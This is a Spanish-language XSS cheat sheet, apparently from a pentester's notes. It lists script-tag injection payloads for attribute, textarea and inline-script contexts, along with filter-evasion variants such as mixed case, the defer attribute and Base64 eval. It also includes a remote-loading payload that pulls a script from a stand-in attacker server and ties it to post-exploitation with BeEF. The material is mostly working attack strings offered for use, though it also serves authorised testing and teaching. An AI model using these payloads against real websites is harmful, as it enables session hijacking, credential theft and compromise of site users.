---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Etiqueta `<script>` Estándar

***

## Cheatsheet

|**Vector / Payload**|**Contexto de Inyección**|**Análisis de la Estructura y Uso**|
|---|---|---|
|`<script>alert(1)</script>`|HTML general.|El vector más básico y directo. Verifica instantáneamente si el motor de renderizado del navegador procesa las etiquetas de apertura y cierre para ejecutar código nativo.|
|`<script src="https://mi-servidor.com/x.js"></script>`|HTML general (Carga remota).|Fundamental para la explotación real. Permite importar payloads complejos, evadir límites de longitud de caracteres en el input y conectar con frameworks de post-explotación (ej. BeEF).|
|`"><script>alert(1)</script>`|Reflejo dentro de un atributo (ej. `value=""`).|Escapa del contexto del atributo cerrando las comillas y la etiqueta anfitriona original (como un `<input>`), forzando al navegador a interpretar el `<script>` como un nuevo bloque HTML.|
|`</textarea><script>alert(1)</script>`|Reflejo en bloques de texto plano (`<textarea>`, `<title>`, `<xmp>`).|Estas etiquetas tratan todo su contenido interno como texto inerte. Es estrictamente necesario cerrarlas primero explícitamente para que la inyección sea parseada como código ejecutable.|
|`';}</script><script>alert(1)</script>`|Reflejo dentro de un bloque `<script>` legítimo existente.|Rompe la cadena de texto de la variable original, cierra el bloque de script preexistente para evitar errores de sintaxis residuales, y abre un entorno de ejecución completamente limpio y controlado.|
|`<script defer>alert(1)</script>`|Filtros léxicos básicos.|Evasión de WAF o listas negras simples que buscan la cadena exacta `<script>`. La inclusión de atributos estándar de HTML5 como `defer`, `async` o `type="text/javascript"` altera la firma esperada.|
|`<script>eval(atob('YWxlcnQoMSk='))</script>`|Filtros de contenido interno.|Oculta el payload malicioso (ej. `alert(1)`) de los filtros que analizan el texto entre las etiquetas. Decodifica el string en Base64 en tiempo de ejecución y lo pasa a la función `eval()`.|

### Ruptura de Contextos Existentes

Cuando la entrada no se refleja en el cuerpo general del HTML, sino dentro de otras estructuras preexistentes, es mandatorio escapar o cerrar ese entorno antes de inyectar la etiqueta `<script>`.

- **Salida de Atributos HTML:** Si el reflejo ocurre dentro del valor de un atributo (ej. un `<input>`), se debe cerrar la cadena y la etiqueta base:
    `"><script>alert(1)</script>`
- **Salida de Bloques de Texto Protectores:** Etiquetas como `<textarea>`, `<title>` o `<xmp>` tratan todo su contenido como texto sin formato. Es necesario cerrarlas explícitamente:
    `</textarea><script>alert(1)</script>`
- **Inyección dentro de un Script Existente:** Si el reflejo aterriza dentro de un bloque de JavaScript legítimo, la forma más segura de tomar el control es cerrar el script original y abrir uno nuevo, neutralizando errores de sintaxis:
    `';}</script><script>alert(1)</script>`


### Modificaciones para Evasión de Filtros Simples

Si el sistema bloquea el payload básico pero no implementa un bloqueo de caracteres especiales (como `<` o `>`), estas variaciones de la etiqueta `<script>` suelen ser efectivas contra listas negras superficiales:
- **Alternancia de Mayúsculas y Minúsculas:** `<sCrIpT>alert(1)</ScRiPt>` (aprovecha la tolerancia de HTML).
- **Inclusión de Espacios Nulos o Blancos:** `<script >alert(1)</script>` o `<script/src="http://x.js"></script>` (rompe expresiones regulares mal diseñadas que buscan `<script>` sin variaciones de espaciado).


***

## Overview

La inyección de la etiqueta `<script>` representa la forma más clásica, directa y fundamental de ejecutar un ataque de [[XSS]]. Este vector asume que la aplicación web refleja la entrada en el [[DOM]] permitiendo la estructura de etiquetas HTML y que no neutraliza de forma explícita la palabra clave `script`.

El objetivo aquí no es depender de manejadores de eventos (como `onerror` o `onload`), sino forzar al motor de renderizado del navegador a abrir un nuevo contexto de ejecución de JavaScript y procesar el código suministrado de forma inmediata.


***

